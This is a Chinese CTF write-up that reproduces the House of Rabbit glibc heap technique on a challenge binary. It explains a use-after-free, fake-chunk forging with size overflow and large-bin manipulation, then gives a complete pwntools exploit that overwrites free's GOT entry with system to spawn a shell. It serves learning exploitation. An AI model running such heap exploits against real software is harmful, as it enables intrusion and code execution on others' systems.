这个题主要还是rabbit的复现。

用来复现house的那个题目unsortedbin被破坏了没法用，找了个经典题目用来复现。

![image-20260721225213660](images\8.png)

add函数，大小固定了而且输入只允许输入7个字节加一个换行符。

free函数很简单，有很明显的uaf。这里就不展示了。

eidt函数也是一样跟add差不多。但是不一样的是存在函数调用：

```
sub_400876(&unk_602120, 48);
_int64 __fastcall sub_400876(void *a1, __int64 a2)
{
  __int64 result; // rax

  LODWORD(result) = read(0, a1, a2 - 1);
  *((_BYTE *)a1 + a2 - 1) = 0;
  return (unsigned int)result;
}
```

往0x602120输入48个字节。很明显这里是用来伪造chunk的。

![image-20260721225839654](images\9.png)

大致伪造的就类似如此。这里之所以要用到0xfffffffffffffff1是为了利用整数溢出躲过malloc的检查（查了一下这个利用整数溢出的手法在2.27中修复了）。这里是要去躲避prev_size的检查因为有溢出所以glibc管理器会错误的认为堆块状态是正常的。然后就是想办法让这个地方（0x602130，因为上面的0x10是用来合法化堆块链的）合法化。

```
add(3,b'aaaa')#0
delt(0)
add(3,b'aaaa')#1
delt(1)
add(1,b'aaaa')#2
add(2,b'aaaa')#3
delt(2)
payload = p64(0) + p64(0x11) + p64(0x0) + p64(0xfffffffffffffff1)
edit(2,p64(0x602130)[:7],payload)
delt(3)
```

利用uaf去修改fastbin的fd，这样这个地址就被并入了fastbin链。

然后释放堆块3触发malloc_consolidate把整个fastbin放入unsortedbin里面。

这时候还要干一件事。伪造的堆块进入unsorted bin时，并不能达到目的，需要进一步使堆块进入large bin。

```
payload1 =  p64(0)+p64(0x11)+p64(0)+p64(0xA00001)
edit(3, p64(0)[:-1], payload1)
```

我们需要去吧堆块大小改掉，这样我们申请0xA00000的时候就会在topchunk里面直接切出来而不是去用我们没有完善的unsortedbin里面的堆块。我们主要目的是要把堆块放到largebin里面。用largebin的简单检查去拿到我们想要的内存地址。

之后我们再把size改回来，然后我们再申请一个超大块。

```
payload2 =p64(0xfffffffffffffff0)+p64(0x10)+p64(0)+p64(0xfffffffffffffff1)
edit(2,p64(0x602130)[:7], payload2)
add(13337, b'a'*7)#5
add(1, p64(elf.got['free'])[:-1])
```

其实这里由于整数溢出类似于向上申请堆块。

确实我们要控制的地方在我们伪造的上面。

之后再申请的小堆块就是放堆指针的地方了。后面的got表改写就不讲了，程序调用了system函数，只需要想办法输入/bin/sh就行。

```
from pwn import *

context.arch = 'amd64'
#r=remote(')
r = process('./11')
elf = ELF('./11')
libc = ELF('./libc1.so.6')
def add(index,txt):
    r.sendline(b'1')
    sleep(0.01)
    r.sendline(str(index).encode())
    sleep(0.01)
    r.send(txt)
    sleep(0.01)
def delt(index):
    r.sendline(b'2')
    sleep(0.01)
    r.sendline(str(index).encode())
    sleep(0.01)
def edit(index,txt1,txt2):
    r.sendline(b'3')
    sleep(0.01)
    r.sendline(str(index).encode())
    sleep(0.01)
    r.send(txt1)
    sleep(0.01)
    r.send(txt2)
    sleep(0.01)
add(3,b'aaaa')#0
delt(0)
add(3,b'aaaa')#1
delt(1)
add(1,b'aaaa')#2
add(2,b'aaaa')#3
delt(2)
payload = p64(0) + p64(0x11) + p64(0x0) + p64(0xfffffffffffffff1)
edit(2,p64(0x602130)[:7],payload)

delt(3)

payload1 =  p64(0)+p64(0x11)+p64(0)+p64(0xA00001)
edit(3, p64(0)[:-1], payload1)

add(3, b'/bin/sh')#4
gdb.attach(r)
payload2 =p64(0xfffffffffffffff0)+p64(0x10)+p64(0)+p64(0xfffffffffffffff1)
edit(2,p64(0x602130)[:7], payload2)
add(13337, b'a'*7)#5
add(1, p64(elf.got['free'])[:-1])

edit(0,p64(elf.symbols['system'])[:-1],b'/bin/sh\x00')
edit(6,b'/bin/sh',b'/bin/sh\x00')

delt(6)
r.interactive()
```

